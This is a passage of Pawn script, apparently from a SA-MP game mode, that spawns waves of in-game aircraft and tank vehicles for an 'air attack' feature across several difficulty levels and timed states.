Stateaa[playerid] = 4;
return true;
}

else if(AsLevel[playerid] == 3)
{
AirAttackV[playerid][23] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]-160.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][24] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-160.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][25] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]-160.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][26] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]-160.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][27] =  CreateVehicle(520, AirAttack[playerid][0]+40.0,AirAttack[playerid][1]-160.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][28] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-160.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][29] =  CreateVehicle(520, AirAttack[playerid][0]+50.0,AirAttack[playerid][1]-160.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][30] =  CreateVehicle(425, AirAttack[playerid][0]+60.0,AirAttack[playerid][1]-160.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][31] =  CreateVehicle(432, AirAttack[playerid][0],AirAttack[playerid][1]-160.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][32] =  CreateVehicle(432, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-160.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][33] =  CreateVehicle(432, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]-160.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][34] =  CreateVehicle(432, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]-160.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);

SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 4;
return true;
}

return true;
}


else if(Stateaa[playerid] == 4)
{

if(AsLevel[playerid] == 1)
{
AirAttackV[playerid][12] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]-140.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][13] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-140.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][14] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]-140.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][15] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]-140.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 5;
return true;
}

else if(AsLevel[playerid] == 2)
{
AirAttackV[playerid][18] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]-140.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][19] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-140.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][20] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]-140.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][21] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]-140.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][22] =  CreateVehicle(520, AirAttack[playerid][0]+40.0,AirAttack[playerid][1]-140.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][23] =  CreateVehicle(520, AirAttack[playerid][0]+50.0,AirAttack[playerid][1]-140.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 5;
return true;
}

else if(AsLevel[playerid] == 3)
{
AirAttackV[playerid][35] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]-140.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][36] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-140.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][37] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]-140.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][38] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]-140.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][39] =  CreateVehicle(520, AirAttack[playerid][0]+40.0,AirAttack[playerid][1]-140.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][40] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-140.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][41] =  CreateVehicle(520, AirAttack[playerid][0]+50.0,AirAttack[playerid][1]-140.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][42] =  CreateVehicle(425, AirAttack[playerid][0]+60.0,AirAttack[playerid][1]-140.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][43] =  CreateVehicle(432, AirAttack[playerid][0],AirAttack[playerid][1]-140.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][44] =  CreateVehicle(432, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-140.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][45] =  CreateVehicle(432, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]-140.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][46] =  CreateVehicle(432, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]-140.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);

SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 5;
return true;
}

return true;
}

else if(Stateaa[playerid] == 5)
{
if(AsLevel[playerid] == 1)
{
AirAttackV[playerid][16] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]-120.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][17] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-120.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][18] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]-120.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][19] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]-120.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 6;
return true;
}

else if(AsLevel[playerid] == 2)
{
AirAttackV[playerid][24] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]-120.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][25] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-120.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][26] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]-120.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][27] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]-120.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][28] =  CreateVehicle(520, AirAttack[playerid][0]+40.0,AirAttack[playerid][1]-120.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][29] =  CreateVehicle(520, AirAttack[playerid][0]+50.0,AirAttack[playerid][1]-120.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 6;
return true;
}

else if(AsLevel[playerid] == 3)
{
AirAttackV[playerid][47] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]-120.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][48] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-120.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][49] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]-120.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][50] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]-120.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][51] =  CreateVehicle(520, AirAttack[playerid][0]+40.0,AirAttack[playerid][1]-120.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][52] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-120.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][53] =  CreateVehicle(520, AirAttack[playerid][0]+50.0,AirAttack[playerid][1]-120.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][54] =  CreateVehicle(425, AirAttack[playerid][0]+60.0,AirAttack[playerid][1]-120.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][55] =  CreateVehicle(432, AirAttack[playerid][0],AirAttack[playerid][1]-120.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][56] =  CreateVehicle(432, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-120.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][57] =  CreateVehicle(432, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]-120.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][58] =  CreateVehicle(432, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]-120.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);

SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 6;
return true;
}

return true;
}

else if(Stateaa[playerid] == 6)
{

if(AsLevel[playerid] == 1)
{
AirAttackV[playerid][20] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]-100.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][21] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-100.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][22] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]-100.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][23] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]-100.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 7;
return true;
}

else if(AsLevel[playerid] == 2)
{
AirAttackV[playerid][30] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]-100.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][31] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-100.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][32] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]-100.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][33] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]-100.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][34] =  CreateVehicle(520, AirAttack[playerid][0]+40.0,AirAttack[playerid][1]-100.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][35] =  CreateVehicle(520, AirAttack[playerid][0]+50.0,AirAttack[playerid][1]-100.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 7;
return true;
}

else if(AsLevel[playerid] == 3)
{
AirAttackV[playerid][59] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]-100.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][60] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-100.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][61] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]-100.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][62] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]-100.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][63] =  CreateVehicle(520, AirAttack[playerid][0]+40.0,AirAttack[playerid][1]-100.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][64] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-100.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][65] =  CreateVehicle(520, AirAttack[playerid][0]+50.0,AirAttack[playerid][1]-100.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][66] =  CreateVehicle(425, AirAttack[playerid][0]+60.0,AirAttack[playerid][1]-100.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][67] =  CreateVehicle(432, AirAttack[playerid][0],AirAttack[playerid][1]-100.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][68] =  CreateVehicle(432, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-100.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][69] =  CreateVehicle(432, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]-100.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][70] =  CreateVehicle(432, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]-100.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);

SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 7;
return true;
}

return true;
}

else if(Stateaa[playerid] == 7)
{

if(AsLevel[playerid] == 1)
{
AirAttackV[playerid][24] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]-80.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][25] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-80.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][26] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]-80.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][27] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]-80.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 8;
return true;
}

else if(AsLevel[playerid] == 2)
{
AirAttackV[playerid][36] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]-80.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][37] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-80.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][38] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]-80.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][39] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]-80.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][40] =  CreateVehicle(520, AirAttack[playerid][0]+40.0,AirAttack[playerid][1]-80.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][41] =  CreateVehicle(520, AirAttack[playerid][0]+50.0,AirAttack[playerid][1]-80.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 8;
return true;
}

else if(AsLevel[playerid] == 3)
{
AirAttackV[playerid][71] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]-80.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][72] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-80.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][73] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]-80.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][74] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]-80.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][75] =  CreateVehicle(520, AirAttack[playerid][0]+40.0,AirAttack[playerid][1]-80.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][76] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-80.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][77] =  CreateVehicle(520, AirAttack[playerid][0]+50.0,AirAttack[playerid][1]-80.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][78] =  CreateVehicle(425, AirAttack[playerid][0]+60.0,AirAttack[playerid][1]-80.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][79] =  CreateVehicle(432, AirAttack[playerid][0],AirAttack[playerid][1]-80.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][80] =  CreateVehicle(432, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-80.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][81] =  CreateVehicle(432, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]-80.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][82] =  CreateVehicle(432, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]-80.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
LaunchZone4(playerid);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 8;
return true;
}

return true;
}

else if(Stateaa[playerid] == 8)
{

if(AsLevel[playerid] == 1)
{
AirAttackV[playerid][28] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]-60.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][29] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-60.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][30] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]-60.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][31] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]-60.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 9;
return true;
}

else if(AsLevel[playerid] == 2)
{
AirAttackV[playerid][42] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]-60.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][43] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-60.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][44] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]-60.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][45] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]-60.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][46] =  CreateVehicle(520, AirAttack[playerid][0]+40.0,AirAttack[playerid][1]-60.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][47] =  CreateVehicle(520, AirAttack[playerid][0]+50.0,AirAttack[playerid][1]-60.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 9;
return true;
}

else if(AsLevel[playerid] == 3)
{
AirAttackV[playerid][83] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]-60.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][84] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-60.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][85] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]-60.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][86] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]-60.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][87] =  CreateVehicle(520, AirAttack[playerid][0]+40.0,AirAttack[playerid][1]-60.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][88] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-60.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][89] =  CreateVehicle(520, AirAttack[playerid][0]+50.0,AirAttack[playerid][1]-60.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][90] =  CreateVehicle(425, AirAttack[playerid][0]+60.0,AirAttack[playerid][1]-60.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][91] =  CreateVehicle(432, AirAttack[playerid][0],AirAttack[playerid][1]-60.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][92] =  CreateVehicle(432, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-60.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][93] =  CreateVehicle(432, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]-60.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][94] =  CreateVehicle(432, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]-60.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);

SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 9;
LaunchZone4(playerid);
return true;
}

return true;
}


else if(Stateaa[playerid] == 9)
{

if(AsLevel[playerid] == 1)
{
AirAttackV[playerid][32] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]-40.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][33] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-40.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][34] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]-40.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][35] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]-40.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
LaunchZone(playerid);
Stateaa[playerid] = 10;
return true;
}

else if(AsLevel[playerid] == 2)
{
AirAttackV[playerid][48] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]-40.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][49] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-40.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][50] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]-40.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][51] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]-40.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][52] =  CreateVehicle(520, AirAttack[playerid][0]+40.0,AirAttack[playerid][1]-40.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][53] =  CreateVehicle(520, AirAttack[playerid][0]+50.0,AirAttack[playerid][1]-40.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 10;
LaunchZone2(playerid);

return true;
}


else if(AsLevel[playerid] == 3)
{
AirAttackV[playerid][95] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]-40.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][96] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-40.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][97] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]-40.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][98] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]-40.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][99] =  CreateVehicle(520, AirAttack[playerid][0]+40.0,AirAttack[playerid][1]-40.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][100] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-40.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][101] =  CreateVehicle(520, AirAttack[playerid][0]+50.0,AirAttack[playerid][1]-40.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][102] =  CreateVehicle(425, AirAttack[playerid][0]+60.0,AirAttack[playerid][1]-40.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][103] =  CreateVehicle(432, AirAttack[playerid][0],AirAttack[playerid][1]-40.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][104] =  CreateVehicle(432, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-40.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][105] =  CreateVehicle(432, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]-40.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][106] =  CreateVehicle(432, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]-40.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
LaunchZone4(playerid);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 10;
return true;
}

return true;
}

else if(Stateaa[playerid] == 10)
{

if(AsLevel[playerid] == 1)
{
AirAttackV[playerid][36] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]-20.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][37] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]-20.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][38] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]-20.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
